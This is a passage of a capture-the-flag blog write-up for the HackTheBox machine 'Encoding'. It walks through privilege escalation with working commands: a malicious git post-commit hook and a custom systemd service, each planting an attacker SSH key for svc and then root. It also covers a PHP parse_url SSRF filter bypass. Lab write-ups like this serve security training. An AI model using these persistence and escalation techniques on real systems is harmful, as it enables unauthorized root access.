+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-path</span> ./.git <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-writable</span> <span class="nt">-print</span>
+<span class="gp">www-data@encoding:~/image$</span><span class="w"> 
+</span></code></pre></div></div>
+<h3 id="execution">Execution</h3>
+<h4 id="strategy">Strategy</h4>
+<p>With write access to the <code class="language-plaintext highlighter-rouge">.git</code> folder, I have access to mess with a lot of configuration for the repo. With the <code class="language-plaintext highlighter-rouge">sudo</code> configuration, I can add and commit files to the repo. There are probably many ways to get execution from this setup.</p>
+<p>One way is to use a post-commit hook, which is a script that runs when files are committed. To commit, I’ll need modified files. Typically files are only added to the repo from within the directory containing the <code class="language-plaintext highlighter-rouge">.git</code> directory (and any subfolders). I’ll modify git to allow files from other locations, and then trigger the commit using the script.</p>
+<h4 id="add-hook">Add Hook</h4>
+<p>This <code class="language-plaintext highlighter-rouge">echo</code> line pipped into <code class="language-plaintext highlighter-rouge">tee</code> will write a <code class="language-plaintext highlighter-rouge">bash</code> script to <code class="language-plaintext highlighter-rouge">.git/hooks/post-commit</code>:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'mkdir -p /home/svc/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" &gt;&gt; /home/svc/.ssh/authorized_keys\nchmod 600 /home/svc/.ssh/authorized_keys'</span> | <span class="nb">tee</span> .git/hooks/post-commit        
+<span class="go">mkdir -p /home/svc/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" &gt;&gt; /home/svc/.ssh/authorized_keys
+chmod 600 /home/svc/.ssh/authorized_keys
+</span><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span><span class="nb">chmod</span> +x .git/hooks/post-commit
+</code></pre></div></div>
+<p>I’ll also set it executable. This script writes a public SSH key into svc’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+<h4 id="make-changes">Make Changes</h4>
+<p>In order to commit, I’ll need to have some changes in the repo. Changes in the <code class="language-plaintext highlighter-rouge">.git</code> folder do not count, as that’s metadata about the repo.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span>git status
+<span class="go">On branch master
+nothing to commit, working tree clean
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">--work-tree</code> argument allows me to specify a directory to consider part of the repo. I’ll add <code class="language-plaintext highlighter-rouge">/etc/hostname</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span>git <span class="nt">--work-tree</span> /etc/ add /etc/hostname 
+<span class="gp">www-data@encoding:~/image$</span><span class="w"> </span>git status
+<span class="go">On branch master
+Changes to be committed:
+  (use "git restore --staged &lt;file&gt;..." to unstage)
+        new file:   hostname
+
+Changes not staged for commit:
+  (use "git add/rm &lt;file&gt;..." to update what will be committed)
+  (use "git restore &lt;file&gt;..." to discard changes in working directory)
+        deleted:    hostname
+</span></code></pre></div></div>
+<p>Not it shows up as new and deleted (which is a bit weird, but I’m doing weird things with <code class="language-plaintext highlighter-rouge">git</code>).</p>
+<h4 id="trigger">Trigger</h4>
+<p><code class="language-plaintext highlighter-rouge">sudo</code> and the script will commit to the repo now since there are changes to be committed.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> svc /var/www/image/scripts/git-commit.sh
+<span class="go">[master b40dd01] Commited from API!
+ 1 file changed, 1 insertion(+)
+ create mode 100644 hostname
+</span></code></pre></div></div>
+<p>It works, and I can SSH as svc:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen svc@haxtables.htb
+<span class="go">Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-58-generic x86_64)
+...[snip]...
+</span><span class="gp">svc@encoding:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And get the user flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">20861ae5************************
+</span></code></pre></div></div>
+<p>There’s also a SSH key in the user’s home directory which I can grab for future use (if I overwrite the previous <code class="language-plaintext highlighter-rouge">authorized_keys</code> I’ll need to re-add <code class="language-plaintext highlighter-rouge">id_rsa.pub</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:~/.ssh$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">authorized_keys  id_rsa  id_rsa.pub  known_hosts
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="sudo-1">sudo</h4>
+<p>svc can run restart services as root using <code class="language-plaintext highlighter-rouge">systemctl</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for svc on encoding:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on encoding:
+    (root) NOPASSWD: /usr/bin/systemctl restart *
+</span></code></pre></div></div>
+<h4 id="etcsystemd">/etc/systemd</h4>
+<p>Services are defined in files in <code class="language-plaintext highlighter-rouge">/etc/systemd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:/etc/systemd$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">journald.conf  logind.conf  network  networkd.conf  pstore.conf  resolved.conf  sleep.conf  system  system.conf  timesyncd.conf  user  user.conf
+</span></code></pre></div></div>
+<p>svc can’t write directly in <code class="language-plaintext highlighter-rouge">systemd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:/etc/systemd$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">journald.conf  logind.conf  network  networkd.conf  pstore.conf  resolved.conf  sleep.conf  system  system.conf  timesyncd.conf  user  user.conf
+</span></code></pre></div></div>
+<p>Nor in the subfolders, except <code class="language-plaintext highlighter-rouge">system</code> has extended attributes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:/etc/systemd$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 48
+-rw-r--r--   1 root root 1282 Apr  7  2022 journald.conf
+-rw-r--r--   1 root root 1374 Apr  7  2022 logind.conf
+drwxr-xr-x   2 root root 4096 Apr  7  2022 network
+-rw-r--r--   1 root root  846 Mar 11  2022 networkd.conf
+-rw-r--r--   1 root root  670 Mar 11  2022 pstore.conf
+-rw-r--r--   1 root root 1406 Apr  7  2022 resolved.conf
+-rw-r--r--   1 root root  931 Mar 11  2022 sleep.conf
+drwxrwxr-x+ 22 root root 4096 Apr 12 15:21 system
+-rw-r--r--   1 root root 1993 Apr  7  2022 system.conf
+-rw-r--r--   1 root root  748 Apr  7  2022 timesyncd.conf
+drwxr-xr-x   4 root root 4096 Jan 13 12:47 user
+-rw-r--r--   1 root root 1394 Apr  7  2022 user.conf
+</span></code></pre></div></div>
+<p>svc can’t read, but can write to <code class="language-plaintext highlighter-rouge">system</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:/etc/systemd$</span><span class="w"> </span>getfacl system
+<span class="c"># file: system
+# owner: root
+# group: root
+</span><span class="go">user::rwx
+user:svc:-wx
+group::rwx
+mask::rwx
+other::r-x
+</span></code></pre></div></div>
+<p>As www-data can, I can still see what’s in this directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:/etc/systemd/system$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">cloud-final.service.wants                   display-manager.service.wants  multi-user.target.wants         rescue.target.wants     snap-snapd-17336.mount            sshd-keygen@.service.d
+cloud-init.target.wants                     emergency.target.wants         multipath-tools.service         sleep.target.wants      snap.lxd.activate.service         sshd.service
+dbus-org.freedesktop.ModemManager1.service  final.target.wants             network-online.target.wants     snap-core20-1634.mount  snap.lxd.daemon.service           sudo.service
+dbus-org.freedesktop.resolve1.service       getty.target.wants             oem-config.service.wants        snap-core20-1695.mount  snap.lxd.daemon.unix.socket       sysinit.target.wants
+dbus-org.freedesktop.thermald.service       graphical.target.wants         open-vm-tools.service.requires  snap-lxd-22923.mount    snap.lxd.user-daemon.service      syslog.service
+dbus-org.freedesktop.timesync1.service      iscsi.service                  paths.target.wants              snap-lxd-23541.mount    snap.lxd.user-daemon.unix.socket  timers.target.wants
+default.target.wants                        mdmonitor.service.wants        pm2-root.service                snap-snapd-16010.mount  sockets.target.wants              vmtoolsd.service
+</span></code></pre></div></div>
+<h3 id="services">Services</h3>
+<p>The <code class="language-plaintext highlighter-rouge">.wants</code> files define which services the service relies on so that it can start in the right order on boot. The <code class="language-plaintext highlighter-rouge">.service</code> files define a service. For example, <code class="language-plaintext highlighter-rouge">pm2-root.service</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Unit]
+Description=PM2 process manager
+Documentation=https://pm2.keymetrics.io/
+After=network.target
+
+[Service]
+Type=forking
+User=root
+LimitNOFILE=infinity
+LimitNPROC=infinity
+LimitCORE=infinity
+Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+Environment=PM2_HOME=/root/.pm2
+PIDFile=/root/.pm2/pm2.pid
+Restart=on-failure
+
+ExecStart=/usr/local/lib/node_modules/pm2/bin/pm2 resurrect
+ExecReload=/usr/local/lib/node_modules/pm2/bin/pm2 reload all
+ExecStop=/usr/local/lib/node_modules/pm2/bin/pm2 kill
+
+[Install]
+WantedBy=multi-user.target
+</code></pre></div></div>
+<p>It sets up the user, the environment, and the commands that run on start, reload, and stop.</p>
+<h3 id="exploit">Exploit</h3>
+<p>svc can edit files like <code class="language-plaintext highlighter-rouge">pm2-root.service</code>, but that risks taking down the webserver for the box. I’ll make my own. ChatGPT will give me a quick template:</p>
+<p><a href="/img/image-20230412125943657.png"><img alt="image-20230412125943657" src="/img/image-20230412125943657.png"/><em>Click for full size image</em></a></p>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">vim</code> as svc to write the service:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:/etc/systemd$</span><span class="w"> </span>vim system/0xdf.service
+</code></pre></div></div>
+<p>As www-data I’ll verify it’s correct:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:/etc/systemd/system$</span><span class="w"> </span><span class="nb">cat </span>0xdf.service 
+<span class="go">[Unit]
+Description=0xdf command service
+
+[Service]
+ExecStart=/tmp/0xdf
+Type=simple
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/tmp/0xdf</code> will look very similar to the git hook from earlier:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">mkdir</span> <span class="nt">-p</span> /root/.ssh
+<span class="nb">chmod </span>700 /root/.ssh
+<span class="nb">echo</span> <span class="s1">'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing'</span> <span class="o">&gt;</span> /root/.ssh/authorized_keys
+<span class="nb">chmod </span>600 /root/.ssh/authorized_keys
+<span class="nb">touch</span> /tmp/script_ran
+</code></pre></div></div>
+<p>And I’ll make sure to <code class="language-plaintext highlighter-rouge">chmod +x /tmp/0xdf</code>.</p>
+<p>Now I’ll restart the service, and <code class="language-plaintext highlighter-rouge">script_ran</code> is now present on the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">svc@encoding:/etc/systemd$</span><span class="w"> </span><span class="nb">sudo </span>systemctl restart 0xdf
+<span class="gp">svc@encoding:/etc/systemd$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/script_ran 
+<span class="go">-rw-r--r-- 1 root root 0 Apr 12 17:19 /tmp/script_ran
+</span></code></pre></div></div>
+<p>That’s a good indication that the script executed as root.</p>
+<p>SSH works as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@haxtables.htb
+<span class="go">Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-58-generic x86_64)
+...[snip]...
+</span><span class="gp">root@encoding:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>And I can get <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@encoding:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">52e6c280************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="background-1">Background</h3>
+<p>When I was talking to IppSec about how I solved this, he was surprised I used <code class="language-plaintext highlighter-rouge">handler.php</code> to get the SSRF working. “Why didn’t you just use the <code class="language-plaintext highlighter-rouge">file_url</code> argument in <code class="language-plaintext highlighter-rouge">/v3/tools/string/index.php</code>?” he asked.</p>
+<p>But I <a href="#ssrf-failsort-of">tried that above</a>! It didn’t work. On comparing notes, the difference was this: my URL started with <code class="language-plaintext highlighter-rouge">http://</code>, and his didn’t!</p>
+<h3 id="analysis">Analysis</h3>
+<p>I’ll play around with this in <a href="https://www.youtube.com/watch?v=sXMqrgsf0b8">this video</a>):</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/sXMqrgsf0b8" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>The summary is that PHP’s <a href="https://www.php.net/manual/en/function.parse-url.php">parse_url</a> function, despite it’s claim that “Partial and invalid URLs are also accepted, <strong>parse_url()</strong> tries its best to parse them correctly”, fails when the scheme is missing entirely, and returns nothing:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">php &gt;</span><span class="w"> </span><span class="k">echo</span> <span class="nb">parse_url</span><span class="p">(</span><span class="s1">'http://image.haxtables.htb'</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+<span class="go">image.haxtables.htb
+</span><span class="gp">php &gt;</span><span class="w"> </span><span class="k">echo</span> <span class="nb">parse_url</span><span class="p">(</span><span class="s1">'image.haxtables.htb'</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+<span class="gp">php &gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>That means that this check works as expected with <code class="language-plaintext highlighter-rouge">http://image.haxtables.htb</code>, but is bypassed when given <code class="language-plaintext highlighter-rouge">image.haxtables.htb</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$domain</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$domain</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">jsonify</span><span class="p">([</span><span class="s2">"message"</span> <span class="o">=&gt;</span> <span class="s2">"Unacceptable URL"</span><span class="p">]);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/04/15/htb-encoding.html"></a>
+</article>
